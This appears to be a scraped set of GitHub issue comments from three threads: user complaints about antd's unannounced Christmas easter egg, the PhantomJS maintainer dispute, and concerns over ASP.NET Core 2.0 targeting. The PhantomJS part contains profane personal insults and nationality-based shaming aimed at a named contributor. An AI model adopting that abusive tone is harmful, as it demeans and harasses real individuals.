105	因为这个christmas彩蛋一大早就被测试提了过来...真的服了
106	哈哈, 惊喜大于惊讶..特地找了一圈..不过还是改成可配置的, 会比较好.
107	"> 本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。

surprised! good luck~"
108	还好没点击按钮跳出个徐锦江
109	只能把锅甩给产品了
110	I don't need `christmas` in my business apps. So unprofessional for a widely used library x(
111	Don't worry too much. The antd team will work it out.  否则，大家等着被祭天
112	为什么不先通知开发者??????
113	你已经是个成熟的框架，不用别人教你不该做什么。。。
114	"是时候杀一个开发者祭天了。
Time to kill a developer  to Celebrate Christmas."
115	群里还说 这是冰雪节限定皮肤  然而这并不好, 希望有全局配置能够对其进行删改
116	国内的开发现状暂时还接受不了这种类型的彩蛋，antd 还是准备公关吧
117	开源的项目，个人觉得应该多高一些这种彩蛋，如果有个彩蛋列表就更好了~
118	Is it April Fool's Day today?
119	哈哈！好玩。
120	官方开玩笑吧，不通知就强行开始彩蛋了？我要重新评估是否需要把ANTD从项目中移除，因为它开始失控了！
121	"> 国内的开发现状暂时还接受不了这种类型的彩蛋，antd 还是准备公关吧
别说国内，国外也一样。。。"
122	感觉互联网产品开发大战要开始了
123	"看业务产品的包容程度吧。如果是比较成熟而严肃的业务不应该出现这种变化的。
In some profession place it should not be enabled by default."
124	这波操作太随意了，会产生对antd团队专业性的质疑
125	还有没有其它彩蛋了，我好都去都关了，太可怕了，会被骂的
126	怎么给项目差评啊？有人会么
127	"> 怎么给项目差评啊？有人会么

弃用之！"
128	"> 感觉互联网产品开发大战要开始了

里程碑啊，这次圣诞事件"
129	吃瓜群众默默的看着。。
130	"> 本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。

保重

"
131	踩蛋
132	这个彩蛋不太适合我们公司的业务产品，太随意了，之前的文档里也从来没见到彩蛋说明
133	我们是单独部署给工厂的项目，工厂要求单独部署都是为了自己的数据安全考虑，这样搞人家就会有一种不安全感，而且难道要我们一家一家给解释？，覆盖代码后都重新给部署一遍吗 。。。
134	两个项目 一个项目老版本，一个项目新版本，以为开发人员造了个隐藏bug
135	Just ridiculous! It's a terrible experience to have such an easter egg for poor developers!
136	对那些是背景是白色的页面，，这些button如同被咬了一口。
137	自认为antd是国内为数不多的靠谱的开源库，这样就太让人大跌眼镜了。
138	you people don't know how to solve this problem, so this issue became a gitter ? come on guys, do a feature hot fix, solve it.
139	"欢迎大家使用 https://github.com/sheinsight/shineout
不会随意添加不通知用户改变行为的彩蛋"
140	hhhh，为此我向客户解释了一番。
141	@smk0621 链接后加个空格
142	一大波bug单已经在路上了，这波操作让我对Ant Design非常失望，他已经变得不再可靠了。
143	完蛋啊，要被祭天了，好几个已经online的项目。
144	I have to update my app on Christmas Eve to remove this. I get the humor, but my platform goes through a design approval process with each client and this was not approved. Now I'm rolling out updates to a bunch of single tenant apps when I should be getting drunk with my family. Thanks!
145	太失望了，对Ant Design好感顿时降低一个数量级。
146	国内开发，不太能接受
147	感觉过了点啊，console里面玩玩就可以了嘛。。太突然了
148	完全失控，彩蛋变踩蛋！请ANTD快速移除吧
149	这一波，老板觉得 ok，马上升职加薪了。
150	"> 太失望了，对Ant Design好感顿时降低一个数量级。

个人对ant好感提升了~"
151	antd 要作死！
152	antd 产品祭天吧
153	以后的框架可以这么介绍自己：“永远不会直接给用户加特效”。
154	至少在更新日志里提一下
155	哈哈哈  测试还没来得及发现
156	太坑了， 被老板骂了
157	产品觉得不错，期待下一次的彩蛋，哈哈
158	"> 产品觉得不错，期待下一次的彩蛋，哈哈

同期待下一波彩蛋"
159	这么多人使用的库，不能这么玩啊，还有没有其它的，请告知，需要去掉
160	我家测试也没发现, 朋友的政F项目已被骂惨
161	如何去掉啊
162	要有一个配置才行的，不能这么玩
163	新年彩蛋可以开始准备了！！！
164	建议放到console。因为这本来就是框架和开发者之间的互动。做前端的，console控制台是必须开的。实在要体现在组件上，那么我觉得应该在production模式下是禁用的。毕竟开发者90%的时间是在开发环境。
165	刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么
166	小玩一下还是可以滴，哈哈~~
167	这个要事先通知开发者的吧，或者由开发者来控制。
168	这么玩😂，真怕其它框架效仿。。。😂
169	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

在风口上被捅了一刀。"
170	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

真的假的"
171	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

真的假的？
"
172	列入黑名單
173	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

当真？"
174	真心不敢用，这次是圣诞，下次可能就是春节，想象下 早上不是被鞭炮炸醒的，而是被 boss 夺命连环 call 醒的。。。。。。。
175	太傻了这彩蛋
176	毛线的彩蛋，我还以为是公司svn服务器被人黑了，后来才发现仅仅是所有用了antd的项目才这样，THIS IS NOT FUNNY !!!!
177	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

啊？"
178	通过植入垃圾代码实现这类愚蠢的彩蛋，这种设计就是一种bug。
179	"身为国人应抵制国外节日，自带这么高流量的企业应该更要带好头弘扬中国的传统文化，
我实在无法忍受一个鸟圣诞，有什么好宣传节日氛围的，还说什么彩蛋，我认为这个是臭蛋。
有些电视剧主角们配件也是人手一台苹果电脑，手机。我们国人什么时候才能雄起，什么时候才能不崇洋媚外啊，哀哉！！！"
180	"我也以为系统被黑了， 然后我又特意搜了一下""spring""之类的看看有没有春节彩蛋。"
181	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

心疼"
182	"![image](https://user-images.githubusercontent.com/14305099/50409169-7b7e4700-082b-11e9-8d1f-8dc62e161026.png)
"
183	"刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么
-------------------
今天也公司也爆出这个问题了，客户投诉量巨增，老板把前端开了，说是造成公司重大损失，一分钱也不赔。"
184	哎! 骂归骂，骂完了接着用，难道还能把架构重新写一遍？还是有更好的react-UI框架推荐？
185	"> 身为国人应抵制国外节日，自带这么高流量的企业应该更要带好头弘扬中国的传统文化，
> 我实在无法忍受一个鸟圣诞，有什么好宣传节日氛围的，还说什么彩蛋，我认为这个是臭蛋。
> 有些电视剧主角们配件也是人手一台苹果电脑，手机。我们国人什么时候才能雄起，什么时候才能不崇洋媚外啊，哀哉！！！

老哥转进如风啊"
186	"> > 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么
> 
> 心疼

好皮 "
187	以为是病毒，想不到竟然是....
188	"> 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么

Really？"
189	以前公司数据库被sql注入过，每个表每个字段都插入一段 img 标签，然后网页能显示的地方都显示出来图片。
190	赶紧取消掉吧，我们这边的业务没法这样搞啊，真要紧急发布？？？？？？？？？
191	看到大家都在喷，我就放心了。另外杭州海创园招前端高级开发！
192	老板问我按钮为什么被狗啃了
193	什么玩意呀
194	如此**专业的开源项目**发生这么**不专业的事情**，痛心！
195	怕是下次就注入漏洞了。
196	"判断写死在代码内的。。。。
"
197	"> ## 刚到公司，就让我收拾东西办理离职手续，好了，本来就在裁人，现在都不用找借口了。问下这个情况可以申请仲裁么
> 今天也公司也爆出这个问题了，客户投诉量巨增，老板把前端开了，说是造成公司重大损失，一分钱也不赔。

真的？裁员的好借口。"
198	这个事情开始发酵了
199	"> 哎! 骂归骂，骂完了接着用，难道还能把架构重新写一遍？还是有更好的react-UI框架推荐？

会流失潜在的开发用户, 估计下次大整改.部分人就会把antd 剔除在考虑的范围内...

还有一些业务不复杂的公司..说替换那替换起来也很快的"
200	客户会觉得你可以操控他们私有的项目，这是一个很可怕的事情，谁来担责
201	这是一个可以一天后自愈的bug（手动滑稽）
202	这太不严谨了。。
203	整个小红帽就够了，结果一大片跟啃的一样，背景还是白的，一点都不像彩蛋，像bug
204	就我想知道title该怎么去掉咩
205	"> 这是一个可以一天后自愈的bug（手动滑稽）

看面向的用户群吧..若是有政F合作这些的..很容易给叼..因为出现了不可控因素..

"
206	"出售花生瓜子。
Sell peanuts and melon seeds。"
207	我想知道明天会好吗？
208	一大早头上莫名多了一个BUG。。。
209	我觉得这个挺好啊。。。很有意思啊，不管是给谁，都有一种节日氛围的感觉
210	antd这波劝退堪比当年的脸书劝退
211	愚蠢的人类
212	"> 出售花生瓜子。
> Sell peanuts and melon seeds。

同售啤酒香烟"
213	"> 整个小红帽就够了，结果一大片跟啃的一样，背景还是白的，一点都不像彩蛋，像bug

我也以为组件出bug了,来这儿一看,嚯,原来是个彩蛋....."
214	就是有点丑！这个白雪花，还不如一个圣诞帽子
215	"> 我觉得这个挺好啊。。。很有意思啊，不管是给谁，都有一种节日氛围的感觉

政府部门不看这个"
216	"> 我觉得这个挺好啊。。。很有意思啊，不管是给谁，都有一种节日氛围的感觉

关键那个效果不忍直视，像狗啃的"
217	花生瓜子方便面，啤酒饮料矿泉水~
218	没有一点点防备
219	zf 不过圣诞节
220	"> > 我觉得这个挺好啊。。。很有意思啊，不管是给谁，都有一种节日氛围的感觉
> 
> 关键那个效果不忍直视，像狗啃的

那倒是，挺丑的！"
221	"![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
还有。。你们的官网首页Christmas好像拼错了吧。。"
222	前排出售小板凳~
223	这个代码也是写死的每年11月25，amazing
224	lower than version 3.9.2 can solve the problem
225	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

为何你这么皮..."
226	https://www.zhihu.com/question/306858501
227	"> > ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> > 还有。。你们的官网首页Christmas好像拼错了吧。。
> 
> 为何你这么皮...

~~~·"
228	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

老哥，还是你稳啊"
229	"> 这个代码也是写死的每年11月25，amazing

12月"
230	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

哈哈还真是，这个眼神无敌了"
231	觉得挺可爱的啊
232	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

你是魔鬼嘛"
233	吃瓜，，，哈哈
234	前排围观
235	"大家可以直接回滚到 3.9.2 之前。。。
另外没有建设型的聊天真的应该停止，让全球跟着看笑话没必要，还暴露自己的水准。

@afc163
`<ConfigProvider snowyButton={true}>` 我认为没必要实现，毕竟不到14个小时节日就过了。没必要占用代码量和流量。"
236	坐等好戏
237	不敢想象4.1日会出现什么！
238	春节会不会来串鞭炮
239	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

滑天下之大稽"
240	我还觉得挺可爱····竟然大多数人不喜欢 ·。·看来这种规模的库还是要首先考虑用户的下限，然后再锦上添花 
241	来瞧一瞧看一看了~~~欢迎各位有前端技术热情的同学加入我们。特别地，我们不会因为一个彩蛋就杀了程序员祭天。。。base 广州，上市公司。广招前端后台~~~有兴趣邮件一下简历谢谢~~~
242	"> 看到大家都在喷，我就放心了。另外杭州海创园招前端高级开发！

这波招聘厉害了"
243	不敢想象4.1日会出现什么！
244	"> ![image](https://user-images.githubusercontent.com/7475347/50409247-3dcdee00-082c-11e9-8ae0-95b0ada33bfd.png)
> 还有。。你们的官网首页Christmas好像拼错了吧。。

把我的九层妖塔拿出来，我要给秀儿蒸笼包子"
245	"Merry Christmas！
圣诞快乐(*^▽^*)
我来写个正确的吧！^_^"
246	"> 来瞧一瞧看一看了~~~欢迎各位有前端技术热情的同学加入我们。特别地，我们不会因为一个彩蛋就杀了程序员祭天。。。base 广州，上市公司。广招前端后台~~~有兴趣邮件一下简历谢谢~~~

优秀啊"
247	大版本4.x.x升级不会给我们一个很大很大的惊喜吧！！！！！？？？？？
248	"这种彩蛋到底是要给客户带来""惊喜""，还是给开发者带来惊吓？"
249	![img](https://i.ibb.co/RNJdBY5/001.gif)
250	弄个投票，我投赞成票！
251	坐等吃瓜
252	真是没一点责任心 不考虑用户使用场景
253	伊斯兰国家过圣诞节吗?打开一看十字军占领自己家网站了?前端被砍死有人负责吗?
254	侵犯我们无神论者的信仰自由
255	这代码怎么加上去的？
256	这波操作很溜，还好我们线上版本没更新，尴尬😓
257	"What about the Spring Festival? Nothing in the Spring Festival?
Ant???
Only Christmas?

------

春节呢?春节没有嘛???
Ant???
只有圣诞?"
258	"Issue 是用来提问题跟解决问题，而不是用来炒热点的，讨论到这份上只能锁了

Issue is used to raise and solve problems, not to stir up hot spots, I lock this."
259	@NickolasBoyer: what are you confused with?
260	"After a while, it is clear that @pixiuPL (=he) and I could not work together.

My side on the story:

* He was _never_ hampered to perform the usual tasks: committing code changes, triaging issues, reviewing and merging pull requests, and even making releases. Various access which he demanded was not a show-stopper, consequently I did not attend to that right away. I planned to address that at some point, just not right away (due to other life commitments).
* Such unfulfilled demands were then blown up out of proportion, culminating in the open letter linked from the main landing page of phantomjs.org. From my perspective, this is passive aggressiveness. It indicated lack of trust and the ability to navigate and resolve conflicts, and it demonstrated a poor social skill, all of which are important (beyond just the technical prowess) in running a community project.

This is not my first rodeo in the open-source community nor my first time dealing with a team dysfunction.
As much as I tried to be as reasonable as possible, I do not believe that the situation sets a good precedent for any future healthy collaboration. Past great collaborators of this project, including @Vitallium who made an enormous, significant progress to PhantomJS for years and years, always put forth the great emphasis on helping each other, vs insisting on the claim of _vanity_, symbolic rights (repository transfer, forum admin, etc).

In all cases, considering our differences in the way we imagine the project must be handled, the case is **solved** amicably: I will archive this repository (#15344), he will continue working on a fork. I thank him for his contribution and wish him all the best.

Thank you for your understanding!
"
261	"@ariya 

As of my inability to lead:: please look at PR's. When I stepped in there was circa 50 of them; now there is **none**. What that suggests? That I have an ability to solve puzzles (oh yes, some of them were quite tricky)..... and I was serious about my contributions (I helped many users here as much as I could). But **I have been blocked** by lack of permissions you gave me (collaborator role is very limited in fact).  **I have also mentioned that in Skype msgs as well as mails**

I didn't commit code changes? Seriously? Just look at commits list to find out how much I commited. What this has to do with hampering?

As of admin rights on forum.... I asked you for them, because I saw **many spam posts** across forums and **I was not able** to clean them as standard user. Thats it - nothing more...

You say you did not attend right away as you were busy with real-life.... OK I understand two, three days of latency, or even everything up-to-week isacceptable for me..... you say you wanted to give yourself time - OK, but you should have replied this, Instead **there was no reply from you**. And thats why I sent another Skype msg/mail.... I thought you miscathed it or sth alike......

And also he accused me of publicizing thing with regards to his family"
262	"@pixiuPL I'm not really a fan of using the Github issue system as social media or any other form of unnecessary discourse but I'll bite. I don't know anything about this situation but why is this necessary? This open letter seems almost solely aimed at portraying Ariya as a incompetent lazy lozer while facilitating your own ego trip, ""it just needs good, devoted leader."" what even is this, we're not building a sandcastle in 4th grade. Again don't know much about this situation but a bit more professionalism and tact would be nice.
"
263	"@NickolasBoyer Im tactful, but (with all respect I have for Ariya) I think he is misunderstanding sth greatly here. As he said above:: we have two different conceptions of how we would go with PJS, thats it.....

And he started to defame me, its not professional nor tactful"
264	"![popcorn](https://user-images.githubusercontent.com/1044223/36946312-e00316b8-1f99-11e8-9749-6133bd740119.gif)
"
265	"@pixiuPL 

I think you misunderstood what he wrote.

The word 'hamper' means restrict, so ""never hampered"" means ""never restricted"". He was saying that you were *always able to* ""perform the usual tasks: committing code changes, triaging issues, reviewing and merging pull requests, and even making releases"". He was **not** saying you failed to do those things.
"
266	@pixiuPL you joined github december 2017. Haven't done much in the open source world either. No one can find your profile in the internet. You have no right to make such accusation, have respect towards original creator. And please earn your respect first before making a rant like this.
267	"Not to add additional banter here but I find it funny that you (@pixiuPL) added this [commit](https://github.com/ariya/phantomjs/commit/938a364e7380b467871bf9d7919c08b0d64bd11a).  Yet you would open an [issue](https://github.com/composer/composer/issues/7016) with this kind of language.  

I would consider the way you communicate to the OSS community as it goes a long way."
268	This kind of things should be done in private @pixiuPL . Can't just bash people for being unresponsive, they have their own life too. If you can't continue maintaining the project, just apologize to the community and provides some positive feedback, no need to bash @ariya for not giving you power. I hope we all learn something from this issue.
269	"@pixiuPL Oh, get off your high horse..  you just joined, [clearly you are toxic to the community](https://github.com/composer/composer/issues/7016), and now you are demanding things? Looking at your ""Open Letter"" you close with a statement:

> Stay tuned for more....

Like you're begging for attention and you also give personal details about Ariya's family member? ..  give it a break.  These type of actions should not be welcome in any type of open source community."
270	This letter is a shame. Sorry but such tone is unacceptable in general between human beings. @ahinkle post shows it's not the first time.. I understand why you're not getting the ownership. A pity for the project though. 
271	"@ariya Are you abandoning this project just because of @pixiuPL or is there any personal reason as well? Asking this cause if it is because of him, then you should just ignore/ditch him and continue your good work with the project. 

Not all people in the open source community might be like him and you may find someone better if you stick to the project or reach out by may be posting in repos like this: https://github.com/pickhardt/maintainers-wanted

All the best."
272	"> I really did care about PhantomJS

What you care about is your recognition, your fame, and your stats.

https://github.com/ariya/phantomjs/commits?author=pixiuPL

Delete/Readd **Entire** Repo (Boosted you to # 4 contributor):
- https://github.com/ariya/phantomjs/commit/a242fb8d605d9aa4afe5bf8d1267c1ded15f157c
- https://github.com/ariya/phantomjs/commit/ddaaa09785d453e41554fd6133a2054c659a317f

Deleting/Adding PR's (Stat Boost):
- https://github.com/ariya/phantomjs/pull/13660 https://github.com/ariya/phantomjs/commit/40699ec4d645265144036263de3ea98481257939 https://github.com/ariya/phantomjs/commit/fcbc946e66b6ee53da69bd7c7d9f76e9601e7911

""PR Fixes"" (Literally Stealing)[&Broken Commits]:
- https://github.com/ariya/phantomjs/pull/12090 https://github.com/ariya/phantomjs/commit/bad3237b1120405efddac759a71a46dde0d3936f https://github.com/ariya/phantomjs/commit/ca5a6c377d408366d0d4b8ecf4539b628420c8f1
- https://github.com/ariya/phantomjs/pull/11373 https://github.com/ariya/phantomjs/commit/cc7f94909421d97742d2aeaf1e2fdbb365f5a028 https://github.com/ariya/phantomjs/commit/695c3c0b3d0a8b4be33a59e44d087fffc420c127
- https://github.com/ariya/phantomjs/pull/13834 https://github.com/ariya/phantomjs/commit/8d971000d84ae8ea9bfcde98a8b1b0e3f180075a https://github.com/ariya/phantomjs/commit/af89fbd125476dc82e86a4056e53a20e430b8bc8

Commits ""Refactoring"" (Some of these made it even harder to read):
- https://github.com/ariya/phantomjs/commit/2c162ceb22ce35158bcc2a34e40c33a703eab1e7
- https://github.com/ariya/phantomjs/commit/a81a38ffabe2cea715ff1c6ab9425f006c3eb166
- https://github.com/ariya/phantomjs/commit/970edb9b683175a6b1f22fb77bff4fbbda957a19
- https://github.com/ariya/phantomjs/commit/6250e772a49383af869cb31f2a5a9e185c26a7a8
- https://github.com/ariya/phantomjs/commit/811593a4d4c6ace5184a744eab1cf43999dad2f0
- https://github.com/ariya/phantomjs/commit/52e4849a36c68b15c6f08c6a8f74a9bd2f134722
- https://github.com/ariya/phantomjs/commit/b586cf21e3cf667cfd35d87093946a4b0f9a1bb3

Straight Up Broken Commits:
- https://github.com/ariya/phantomjs/commit/f94b7e52c569ca04d0d350a02f7b7b0e926e7c1c
- https://github.com/ariya/phantomjs/commit/f5ba2434fd3b718286be9051aef026be55f7066c

There is so much bullshit that I got tired of looking for them, do you even look at the shit you are committing?

>  I’m resigning from position of collaborator

Please fucking do

> just received message from Ariya on Skype asking me to respect his privacy. I allegedly not respected his privacy by giving out vague information about reason of his absence (REDACTED).

Are you kidding me, there's no reason in the world should you bring up his own personal issues.

> Stay tuned for more to come….

Now you are just seeking for attention.

https://github.com/ariya/phantomjs/blob/master/CODE_OF_CONDUCT.md#enforcement

> Instances of abusive, harassing, or otherwise unacceptable behavior may be reported by contacting the project team at devs4@protonmail.com. The project team will review and investigate all complaints

Really? The project team, then putting your own personal email? You act like you are doing all the work when you are actually stealing.

https://github.com/ariya/phantomjs/blob/bbbd0c073b29e3932ea7956b06c7ee439437d6dc/package.json#L5-L11

Please remove yourself, you did nothing"
273	"Wow, thats wrong on so many levels, I feel bad for @ariya having to deal with all of this.

https://github.com/ariya/phantomjs/blob/master/package.json

https://github.com/ariya/phantomjs/pull/15316

https://github.com/ariya/phantomjs/pull/15299/files

Most PR's are Markdown only...

Also PR's to another projects **CHANGELOG** do not put PJS in a great light: https://github.com/SeleniumHQ/selenium/pull/5468

https://github.com/composer/composer/issues/7016 ..."
274	@pixiupl wez sie ogarnij. Przynosisz wstyd narodowi swoim spierdoleniem umyslowym. Twoje commity sa bezuzyteczne insprowadzaja sie do dodawania spacji/ spierdalania kodu pseudofaktoringiem. Usun konto gita i przestan sie osmieszac.
275	Along what @interatir said - @pixiuPL I wish that `PL` in your username wasn't an indication of my home country, cose you're a disgrace, politely put.
276	"@ariya, as @tvvignesh put it, please do *not* archive this project *just because* of a random contributor's mental meltdown. Given its popularity, I am sure it is possible for phantomjs to find a new team of core contributors if you can't take it anymore.

Props to you for staying exceptionally professional despite the situation. You have the support of the OSS community! :ok_hand: "
277	"Hi everyone,

Instead of starting a flamewar against @pixiuPL , it would be a lot more productive to just [report him](https://github.com/contact/report-abuse) for breaching the [terms of service of GitHub](https://help.github.com/articles/github-terms-of-service/#3-conduct-restrictions), most notably:

> harass, abuse, threaten, or incite violence towards any individual or group, including GitHub employees, officers, and agents, or other GitHub Users;

> violate the privacy of any third party, such as by posting another person's personal information without consent.

Instead of taunting him, we should just collectively make sure he can never harass open source contributors from now on.

EDIT: forgot this one (impersonation of the project owner described in [ @RumbleFrog 's comment](https://github.com/ariya/phantomjs/issues/15345#issuecomment-370269460) ) :

> impersonate any person or entity, [...] by fraudulently misrepresenting your identity [...]"
278	This is the saddest thing I have ever seen in my whole life , damn you @pixiuPL 
279	Just reported this @pixiuPL guy. I hope that github will ban him.
280	@ariya please don't close this project i'm not good open source contributors but please don't close phantomJS just because this. please
281	"Well, Pixel seems like he thinks a couple of months of removing carriage returns makes him lead developer.
This should have been resolved with a swift removal of rights, let him vent all over reddit, he'll just be roundly mocked.
Part and parcel of internet comms in OSS though. Attract all sorts."
282	"<img width=""390"" alt=""screen shot 2018-03-05 at 10 55 49"" src=""https://user-images.githubusercontent.com/2966794/36968795-e823d196-2063-11e8-89fe-5879b41e655d.png"">
"
283	come at the king you best not miss
284	"Well, we've reached the point in the drama where people are talking like Omar from ""The Wire,"" so thanks everyone."
285	Well, there vanishes my hope of seeing PhantomJS coming back to life with full steam ahead. A sincere thanks to all that are involved in the project, and hopefully we'll see positive development soon.
286	"> @pixiuPL you joined github december 2017. Haven't done much in the open source world either. No one can find your profile in the internet. You have no right to make such accusation, have respect towards original creator. And please earn your respect first before making a rant like this.

[deleted]"
287	"@jomo I would disagree, this seems to be a forgotten commit from 2015 that was merged this january.
The commit 66102e5 you are referencing is a merge commit, made by pixi, with the changes from nwolfe.

Apart from that, I would suggest to not try doxxing pixiuPL, event though it is just digging for other online identities.
It's none of our business and it doesn't help in this situation. Just imaginge you are wrong and nwolfe-xx has nothing to do with this, it still will show up in his history and may look shady to people looking him up."
288	Report this guy, useless commit!
289	@3stadt you're right, I was a little confused by how GitHub displays these things.
290	"@jomo: sorry for being so quiet on this, had no idea that my PR from 2015 was involved in this flame war.  It looks to me like pixiuPL merged it since I never responded to the requests for changes (various excuses for that...) . I used that original code change at my last job, it did exactly what we needed it to do, but if it's not needed by the community, I'm fine with that.  
"
291	How did this guy become a collaborator in the first place? Almost all of his [commits](https://github.com/ariya/phantomjs/commits?author=pixiuPL) are either simplest changes (removing random empty lines WTF?) or bad merges, and then _fixes for his bad merges_. Just… wow. I'd say @ariya asked for this by granting this moron the write access to such an important repository.
292	"I think ""such an important repository"" might be overstating the case a little, given the rapid decline in popularity of PhantomJS thanks to chrome-headless, jest, enzyme and recent evolutions in frontend testing."
293	AFAIK, PhantomJS is the one to start and inspire the rest, which sounds pretty important to me, but this is off-topic anyway.
294	Selenium might have that distinction
295	Hello any plans phantomjs support async/await. Please.
296	"@revmischa you are right, most new stuff is/should be developed using headless chrome and the like, however *A LOT* of old projects like screenshot tools, ssl checks etc. are still implemented using  phantomjs, so its still an important repository. 

https://www.npmjs.com/package/phantom
```
Stats
5.339 downloads in the last day
26.717 downloads in the last week
146.731 downloads in the last month
```"
297	"Second what you said @MichaelErmer - this is the other PJS package by Medium

https://www.npmjs.com/package/phantomjs-prebuilt

```
Stats
106,885 downloads in the last day
595,314 downloads in the last week
2,470,571 downloads in the last month
```"
298	@nwolfe-xx all good! Please ignore my original comment, I was mistaken and have already deleted it.
299	@kid-icarus Try to follow #15342 instead. While at it, please also read #14541.
300	"> I'd say @ariya asked for this by granting this moron the write access to such an important repository.

@phanan It doesn't mean that I didn't learn my lesson, but remember: hindsight is 20/20."
301	"@ariya I think you should to reset the master branch to an earlier release as it and its commit history seems to be entirely broken, just look at stuff like this: 
https://github.com/ariya/phantomjs/commits/master/src/config.cpp
https://github.com/ariya/phantomjs/commit/a242fb8d605d9aa4afe5bf8d1267c1ded15f157c#diff-498d06653ad4a59db94a430cfa6f3937
https://github.com/ariya/phantomjs/pull/15347"
302	@MichaelErmer Already planned, please follow #15344.
303	"> Delete/Readd Entire Repo (Boosted you to # 4 contributor):
> a242fb8
> ddaaa09

Call me paranoid, but this is a perfect way to introduce a malicious change to the codebase and disguise it as ignorance. Was any new release made with this changes? "
304	@dabrowt1 Check #15344 (releases are removed, master branch will be reverted).
305	@ariya Close this thread dude. Or wait, never mind. I will grab a popcorn.
306	The resolution has been reached. I'm closing this issue for now. Thanks everyone for your help!
307	This would be an extremely weird and bad change to make. I have written a lot of netfx-only asp.net core code and do not want to see that investment wasted. More generally, .NET customers are going to need to be able to interoperable between ASP.NET Core and Desktop code for the foreseeable future - imagine webapps which use Active Directory, or Office COM automation, or which do thumbnailing using some System.Drawing based library, or share code with a WPF app. It's trivial to think of a lot of scenarios like this and I hope we've simply misunderstood what's going on.
308	"We're currently on AspNetCore 1.1.1 - i.e, the ""current"" support branch. If we cannot move to 2.0 due to dependencies on Net4XX, does that mean we'll be unsupported when 2.0+3months drops?"
309	"We use a combination of WPF and ASP.NET Core and target in both cases the full framework.
So I guess no 2.0 in the foreseeable future?"
310	"But full framework 4.6.1 will support netstandard 2? am I missing something? (https://docs.microsoft.com/en-us/dotnet/articles/standard/library)

isn't this that the current tooling isn't updated? "
311	it would be totally fine and expected to see asp.net core running on net*standard* 2. the alarming thing is this prospect of moving to net*core*app2.0, which would imply no longer being able to use legacy code inside of asp.net core websites 
312	"oh, that's an issue.. I suppose though that its mitigated a little by the compat shims in netcore2 that allows you to reference old assemblies, but still, it means porting all projects to the new project system and a lot of other work..

Would be nice to hear the teams reasoning on this
"
313	oh, so you think that netcoreapp2.0 projects will simply be able to reference netfx libs thanks to type unification? that would explain a lot. my question, if so, is how much code will actually work when run on windows but on the core CLR..
314	Wow. This would be totally blocking for us and basically make sure we could never update these packages for the far foreseeable future. We even might need to migrate our MvcCore project back to Mvc, because we currently cannot get around targetting net462+.
315	"I'm extremely curious about this as well. I'm really hoping this in an intermediate (and short lived) step or a big miscommunication. It would certainly be a blocker to adoption for most of our applications as well.

Moving everything to Core is just too much for a large existing codebase (without stopping dev to do it), moving to the new ASP.NET Classes (HttpRequest, controllers, etc.) as an intermediate step *has* to happen for our main projects.

Perhaps @DamianEdwards or @davidfowl can comment on plans here? I'm also having trouble finding any additional reasoning."
316	"I can see why this is initially a scary WTF moment. Let me explain because it’s less freaky than it seems.

* You said .NET customers are going to need to interoperate. Totally agree. 
    * We can share netstandard libraries between ASP.NET Core 2.0 and EVERYWHERE.
    * We can even reference many net461+ assemblies from ASP.NET Core 2.0 because of typeforwarding and netstandard20 
* You said WebApps may need to use: 
    * AD – Totally, this is a gap IF you want to call LDAP directly. You can certainly auth against Windows Auth NOW. We plan to have specifically the DirectoryServices namespace for Core 2.0 around summer timeframe
    * Drawing – Totally, this is a gap. We plan to have this for Core 2.0 around summer timeframe. Until this, these netstandard options also exist ImageSharp, ImageResizer, Mono options, etc
   * COM Automation – This has never been possible under Core 2.0, but you can certainly PInvoke if you want to hurt yourself. You could also local WebAPI to a net461+ process if you really want to hurt yourself.
    * Sharing code with WFP Apps – YES. Totally possible with netstandard2.0.
* This is a weird change to make. 
    * Feels like it but…

Think about it this way. WPF isn’t netstandard2.0, it knows it’s on net461+ and that’s OK. It’s optimized, but it can reference netstandard libs. ASP.NET Core 2.0 is optimize for Core 2.0 but it can reference shared libraries. Xamarin is the same. 

.NET Core is side by side and it’s moving fast. It’s WAY faster than .NET (Full) Framework can move which is good. By building ASP.NET Core 2.0 on top of .NET Core 2.0 (which, remember, is a SUPERSET of .NET Standard) that means stuff can be built faster than NetFx or even Netstandard.

NetCore > Net Standard > NetFx when it comes to development speed and innovation.

Point is, if you are doing new work, netstandard20. If you have older net461+ libraries, MOST of those can be referenced under ASP.NET Core 2.0.

